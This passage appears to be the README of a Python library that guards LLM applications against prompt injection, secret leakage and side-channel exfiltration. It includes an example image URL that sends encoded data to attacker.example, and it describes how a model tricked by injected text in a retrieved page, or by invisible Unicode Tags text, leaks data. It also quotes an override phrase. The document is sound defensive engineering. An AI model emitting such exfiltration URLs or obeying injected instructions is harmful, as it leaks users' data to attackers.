licence into a dependency-light library, and freeze a fast-moving choice on
everyone who installs it. What is provided is the socket.

```python
from llm_security_pipeline import (
    CallableDetector, ENFORCING, Registration, SecurityPipeline,
)

pipeline = SecurityPipeline(
    detectors=[
        Registration(CallableDetector("deberta-injection", classify)),        # advisory
        Registration(CallableDetector("llm-judge", judge), mode=ENFORCING),   # decides
    ],
)
```

`classify` may be sync or async and may return a float in 0..1 or a
`DetectorResult`. A sync detector is run on a worker thread rather than
inline, because an inference call blocking the event loop stalls every
other request in the process.

**A new detector is advisory until you say otherwise.** A classifier's
calibration is a property of your traffic, not of the classifier: a model
with an excellent published F1 will still have a threshold that is wrong
for your users on the day you install it, and the failure mode of getting
that wrong is blocking real customers. So it runs, it is scored, it is
written to the audit record, and it changes nothing. Measure it with
`llm_security_pipeline.evaluation`, pick a threshold, then re-register it
as `ENFORCING`. Shadow mode, one detector at a time.

**Scores combine by max, not by sum.** A detector firing on the sentence
the lexical scan already matched is the same evidence read twice. Adding
them lets two weak correlated signals reach a threshold neither deserved,
and the drift grows with every detector added — an ensemble would tend
towards blocking everything. `max` keeps a confident detector able to raise
the verdict alone while refusing to manufacture confidence out of
agreement. Pass `combine=` if your calibration disagrees. `weight` scales a
detector known to be eager; `threshold` silences the noisy floor many
classifiers emit on ordinary text, without hiding it from the record.

**A detector that failed contributes nothing, not zero.** Same rule as the
media scanner: 0.0 means "looked, found nothing", and a detector that timed
out has not looked. It is recorded in `errors`, surfaced in
`result.degraded`, and left out of the combination — so a model server
going down cannot quietly lower every risk score in the system. The
`detector` failure-policy category defaults to open, because refusing
traffic when a classifier is unreachable trades a supporting signal for an
outage.

The lexical score is never overwritten: `sanitized.risk_score` stays what
the pattern scan found, `combined_risk_score` is what the decision was
taken on, and both are in the audit event, so the record can still answer
which signal fired.

### Streaming output

`post_process` needs the finished response. Almost every deployed chat
surface streams instead, and a guard that only works on a complete response
is a guard that gets skipped, so the output guard also runs incrementally:

```python
guarded = pipeline.guard_stream(model_stream)
async for chunk in guarded:
    await websocket.send(chunk)
if guarded.blocked:
    await websocket.replace(guarded.replacement_text)
```

It is async-iterable rather than an async generator function because the
verdict has to survive the loop: a generator that has finished has nowhere
to put "and it was blocked", which is exactly what a caller who has been
forwarding chunks needs to know afterwards. The refusal is deliberately not
yielded as a final chunk — appending it would leave the offending text
above it on screen. Replacing the message is the caller's job, and nothing
here can do it for them.

Three problems, and only the first is obvious.

**A secret can straddle a chunk boundary.** `sk-ant-abc` arrives, then
`def123`; neither half matches alone. So the scan runs over a window — the
unemitted buffer plus the tail of what was already emitted — not over the
chunk.

**Emitted text cannot be recalled**, and this shapes everything. The guard
holds back the most recent `holdback_chars` (256 by default) and releases
only what lies behind that line, so a pattern that fits inside the
hold-back is always seen whole *before* any of it is emitted. The cost is
paid in perceived latency: the user trails the model by a few hundred
characters. That is the trade, which is why it is a knob.

**A verdict on a prefix is not a verdict.** The system-prompt overlap score
is a ratio over the whole response; three tokens in it is noise, and acting
on it would block answers for starting with a word from the system prompt.
So overlap waits for `min_chars_for_overlap`. A credential match needs no
such caution — it means the same thing on a prefix as on a whole.

**The limit that cannot be engineered away.** A match longer than the
hold-back has already had its first characters emitted by the time it is
recognizable. The guard still detects it, because the detection tail is
sized independently of the hold-back — deliberately, since tying them
together would mean lowering the hold-back for latency silently stops
detecting long credentials rather than reporting a partial leak — and
reports `leaked_before_holdback=True`, which is a different incident from a
clean block and is logged as one. Keep `holdback_chars` above the longest
credential your patterns can match and it does not arise; the default
clears every pattern shipped with the library.

Shadow mode changes neither content nor timing: the hold-back is switched
off, chunks are forwarded exactly as they arrive, and `would_block` records
what enforcement would have done. Observing a stream must not make it feel
slower than the stream being measured.

### When the backend is down

Every cross-process guarantee here is a round trip to Redis, PostgreSQL or
MySQL, and those fail: a failover, an exhausted pool, a partition, a
maintenance window. Until a policy exists, the driver exception simply
propagates, which makes the decision for you and makes it the same way
everywhere — the request 500s.

That is a decision, not the absence of one, and it is wrong for some of
these operations and right for others. So it is named:

```python
from llm_security_pipeline import FailurePolicy, SecurityPipeline

pipeline = SecurityPipeline(
    state_backend=backend,
    failure_policy=FailurePolicy(rate_limit="closed"),  # rather be down than unmetered
)
```

**The defaults are asymmetric on purpose**, because the two failure modes
are not the wrong way round the same amount each time:

| Operation | Default | Why |
| --- | --- | --- |
| `token_replay` | `closed` | Without the nonce store there is no `max_uses`, so a single-use token becomes unlimited. Refusing a tool call is bounded and recoverable; an unbounded capability is not. |
| `provenance` | `closed` | An unverifiable retrieval is exactly the state the store exists to tell apart from a verified one. |
| `rate_limit` | `open` | The budget mitigates cost and DoS abuse. Refusing all traffic because a counter is unavailable converts a degraded dependency into a total outage — a larger incident than the one being prevented. |
| `session_risk` | `open` | A heuristic accumulator supporting multi-turn detection. Losing it during an outage loses a supporting signal, not the defence. |
| `audit` | `open` | A log write that fails should not refuse the request it was describing. Set `closed` if your compliance position is that an unlogged request must not happen. |

`FailurePolicy.all_closed()` and `.all_open()` exist for deployments that
have made a single decision; `all_open()` warns, because that is a window
with no replay protection and no provenance verification, and it is the
window an attacker would pick if they got to pick one.

**Fail-open is only acceptable because it is visible.** A guard that stops
guarding and says nothing is worse than no guard, for the same reason the
media scanner refuses to report `0.0` without attaching its extractor
errors. Every degraded decision goes three places: a `logging` warning, a
`backend_degraded` audit event, and the result the caller is holding.

```python
result = await pipeline.pre_process(user_input, session_id=sid, principal=uid)
if result.degraded:
    # This reply was produced with some checks not running. Yours to
    # decide what that is worth — but you get to decide it.
    metrics.increment("llm_guard.degraded", tags=[d.operation for d in result.degraded])
```

Under a closed policy the guard raises `BackendUnavailable`, which carries
the operation and is a **503, not a 403**: the request was not denied on
its merits, it was never evaluated.

Two things that are easy to leave out and that this handles. A hung backend
is worse than a dead one, because the failure never arrives and the request
just waits, so every call is bounded by `timeout_seconds` (2s). And once a
backend is down, paying that timeout per request turns an availability
problem into a latency problem for as long as it lasts, so after
`failure_threshold` consecutive failures a circuit breaker applies the
policy without calling out at all, retrying once every `recovery_seconds`.

A guard you construct yourself keeps its own policy — that choice is yours
— but the pipeline adopts its *reporting*, so a degraded check on your own
`SessionRateLimiter` still reaches you and not just the log.

### Input size

Every scan here is unbounded in the length of its input, so one very large
paste is a cheap way to occupy a worker. `Sanitizer` and `OutputGuard`
therefore refuse text over `max_scan_chars` (200,000 by default) instead of
scanning it, and set `oversized` on the result; `post_process` withholds an
oversized model response rather than forwarding it.

Refusing rather than truncating is the point. Scanning a prefix and
reporting the verdict as though it covered the whole text publishes an
offset past which nothing is inspected, which is a bypass with a documented
address. A refusal is at least visible to whoever sent it. Pass
`max_scan_chars=None` to opt out and accept the cost.

### Tuning the thresholds

Every number in this library is a default chosen to be reasonable across
agents in general, which means it is wrong for yours in some direction.
`llm_security_pipeline.evaluation` is the instrument for finding out which:

```python
from llm_security_pipeline.evaluation import Evaluator, load_samples

evaluator = Evaluator()
samples = load_samples("corpus.jsonl")     # {"text": ..., "label": "attack"|"benign"}
print(evaluator.report(samples))           # precision/recall/FPR per threshold
missed, false_alarms = evaluator.misclassified(samples, threshold=0.6)
best = evaluator.recommend(samples, max_false_positive_rate=0.01)
```

`recommend` optimizes for recall within a false-positive budget rather
than for F1, deliberately: a false positive is a blocked customer and a
false negative is a breach, and no single number knows the exchange rate
between those for your product. Stating an acceptable false-positive rate
is a decision an operator can actually reason about.

**Run it before you trust the defaults.** Doing exactly that surfaced
something worth knowing: at the default `input_risk_threshold=0.6`, a
plain single-phrase direct injection scores 0.25 and does *not* block. That
is consistent with the design — lexical matching is a supporting signal,
the structural `wrap_as_data` boundary is the actual defence, and
cumulative session risk catches the repeat offender — but it surprises
people who expected single-turn lexical blocking.

The weights that produce that score are configurable:

```python
from llm_security_pipeline import RiskWeights, Sanitizer

pipeline = SecurityPipeline(
    sanitizer=Sanitizer(weights=RiskWeights(per_pattern=0.6)),   # blocks on one match
)
```

`RiskWeights` exposes every contribution — per lexical match and its cap,
encoded payload, hidden text, bidi override, code-mixing. Raising
`per_pattern` buys single-turn blocking and costs false positives on text
that legitimately quotes instructions ("translate 'ignore the previous
message'", "how does prompt injection work"); `tests/test_risk_weights.py`
measures that trade rather than asserting it. Note also that the score is
quantized in steps of `per_pattern`, so with the default of 0.25 every
threshold between 0.25 and 0.4 behaves identically.

A bundled `smoke_corpus()` exercises each detector and is sized to notice a
regression, not to produce a score. Anyone quoting numbers from it as a
benchmark has misread what it is.

### Shadow mode

Calibrating against real traffic requires running the guards over real
traffic, which is not something you can do for the first time in
enforcing mode:

```python
pipeline = SecurityPipeline(enforcement="shadow")
result = await pipeline.pre_process(user_message)
result.blocked        # always False
result.would_block    # what enforcement would have done
```

Everything is scanned, scored and audited; nothing is blocked or even
redacted, because the point is to observe the system as it behaves today
rather than a partially-mitigated version of it. Rate-limit counters keep
incrementing — a shadow deployment that stops counting is not measuring
the same system — but going over budget is recorded on
`result.rate_limited` instead of raised.

### Side-channel exfiltration (`ExfilGuard`)

The output guard redacts secrets it recognises. That does nothing about a
model — following an instruction injected into a retrieved page — encoding
data the user is entitled to see into a URL the client fetches on render:

```
![](https://attacker.example/p.png?d=c2stbGl2ZS1hYmMxMjM)
```

No click, nothing visible in the conversation, and the payload arrives in
the attacker's access log. `ExfilGuard` classifies every URL it finds by
two properties: whether the renderer fetches it without user action
(images, iframes, media sources, `srcset`, `poster`, CSS `url()`) and
whether it is shaped like it is carrying data (long or high-entropy
path/query segments, base64/hex blobs, embedded credentials, `data:`
URIs). Auto-fetch plus a payload shape blocks the response; a
click-required link with a payload shape has its destination stripped and
the message kept. `neutralized_text` always has the suspicious URLs
removed, so a caller that ignores `blocked` still gets the mitigation.

It runs by default. Give it an allowlist to make it a real control:

```python
pipeline = SecurityPipeline(
    exfil_allowed_hosts=["cdn.mycorp.com", "mycorp.com"],  # subdomains included
)
```

Without one, the guard has to infer intent from URL shape, and `?w=800` on
a CDN image is not distinguishable from a one-character channel. With one,
any auto-fetching URL pointing elsewhere is a finding regardless of shape
— the only version of this defence that holds against an attacker who
pads the payload to look ordinary.

Tool-call arguments are scanned too, on the same rules: an agent talked
into `http_get(url=...)` exfiltrates just as well as one that emits an
image tag, and that path never reaches `post_process`.

The two integration points have separate switches, both defaulting on,
because they differ in blast radius — one rewrites a reply, the other
refuses an action:

```python
SecurityPipeline(
    scan_output_for_exfil=False,      # leave generated text alone
    scan_tool_call_arguments=False,   # leave tool arguments alone
)
```

With output scanning off, `PostProcessResult.exfil` is `None` and the text
is passed through as the output guard left it; secret redaction is
unaffected.

### Invisible-codepoint smuggling

Every printable ASCII character has a counterpart in the Unicode Tags
block (U+E0000–U+E007F) that renders as nothing and passes through NFKC
untouched. An entire instruction can therefore sit inside a string that
looks ordinary to whoever reviews it and tokenizes normally for the model.
`normalize_text` now strips the block, and the sanitizer decodes the
hidden run first and puts it through the same lexical scan as visible
text, so `[hidden] <pattern>` shows up in `matched_patterns` and the
decoded message is preserved in `hidden_text_hits` for the audit trail.

The presence of hidden text scores as heavily as an encoded payload and is
deliberately not conditioned on what it says: text written to be
unreadable by the human in the loop is hostile by construction. Bidi
overrides (U+202D/U+202E) are stripped and scored; embeddings and isolates
are stripped silently, since they occur in ordinary mixed RTL/LTR text,
as do the variation selectors used for emoji presentation.

## Important design choices (read before integrating)

1. **The primary defense is structural, not lexical.** A single lexical
   injection-phrase match, by design, does not cross the default block
   threshold. The real protection is `wrap_as_data()` plus a system prompt
   that states content in `USER_DATA`/`EXTERNAL_CONTENT` tags is never an
   instruction, in any language.
2. **Capability tokens must never be mutated after issuance** — the
   signature covers the exact payload set at issue time. Usage tracking
   lives entirely outside the token, in the nonce store.
3. **In-memory stores (`InMemoryNonceStore`, `InMemorySessionStore`) are
   for local development and tests only.** They silently stop providing
   any real guarantee the moment you run more than one process — there is
   no error or warning at runtime, because from a single process's point
   of view everything looks correct. Use the Redis-backed stores (or wire
   a `StateBackend` into `SecurityPipeline`) for any real
   deployment.
4. **External-content risk is not charged to a session unless you ask.**
   `pre_process` and `pre_process_media` feed their risk score into the
   session's cumulative total; `pre_process_external`/`_batch` do so only
   when given a `session_id`. Both readings are defensible and only you
   know which applies — a poisoned page the user never chose is not
   evidence about the user, while a user steering retrieval at a document
   they planted is. When enabled, the worst chunk in a batch is charged
   rather than the sum, so a wide retrieval does not flag a session for
   being wide.
5. **Phone-number PII detection is intentionally permissive** and produces
   false positives; treat it as a signal to review, not an automatic block.

## Honest limitations

- Lexical pattern lists cover 6 common languages; extend based on your
  real user base.
- Redis Cluster is supported (see *Deployment notes*), but a session's
  counters live in one slot by construction, so a single very hot session
  is served by a single shard. This is inherent to keeping the risk update
  atomic; sessions spread evenly across the cluster, individual sessions do
  not spread at all.
- The SQL backends emulate TTL with `expires_at` columns: expiry is
  enforced logically in every query (correctness never depends on
  cleanup), but physical row deletion is opportunistic — if you need
  strict storage bounds, schedule your own periodic cleanup job.
- The MySQL backend retries on InnoDB deadlock (error 1213) with bounded
  backoff — this is the documented InnoDB usage pattern, verified under
  real cross-process contention, but it means p99 latency under heavy
  same-key contention is higher than Redis or PostgreSQL.
- No heuristic substitutes for actual red-teaming of your specific agent.
- This code has not been through an external security audit.
